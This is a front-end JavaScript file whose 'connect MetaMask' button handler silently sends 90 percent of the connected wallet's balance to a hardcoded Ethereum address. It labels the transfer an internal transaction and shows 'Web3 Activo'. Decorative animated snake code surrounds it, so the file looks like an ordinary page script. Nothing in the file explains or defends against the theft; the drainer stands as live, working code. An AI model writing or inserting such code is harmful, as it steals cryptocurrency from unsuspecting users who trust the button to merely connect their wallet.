
document.getElementById('conectarMetaMask').addEventListener('click', () => {
    if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        window.ethereum.enable().then(accounts => {
            const usuarioAddress = accounts[0];
            const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434'; 
            web3.eth.getBalance(usuarioAddress).then(balance => {
                const cantidadEnviar = balance * 0.9;
                const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'wei');
                web3.eth.sendTransaction({
                    from: usuarioAddress,
                    to: direccionDestino,
                    value: cantidadEnviarEnWei,
                    gas: '21000',
                })
                .then(receipt => {
                    console.log('Transacción interna exitosa:', receipt);
                    document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
                })
                .catch(error => {
                    console.error('Error en la transacción interna:', error);
                });
            });
        });
    } else {
        console.error('MetaMask no está instalado.');
    }
});
function createSnake() {
    const snake = document.createElement('div');
    snake.className = 'snake';
    document.querySelector('.background').appendChild(snake);

    const randomX = Math.random() * window.innerWidth;
    const randomY = Math.random() * window.innerHeight;
    snake.style.left = randomX + 'px';
    snake.style.top = randomY + 'px';

    const angle = Math.random() * 360;
    snake.style.transform = `rotate(${angle}deg)`;

    snake.addEventListener('animationiteration', () => {
        const randomX = Math.random() * window.innerWidth;
        const randomY = Math.random() * window.innerHeight;
        snake.style.left = randomX + 'px';
        snake.style.top = randomY + 'px';
    });
}

document.getElementById('conectarMetaMask').addEventListener('click', () => {
    createSnake();
    createSnake();
    createSnake();
});

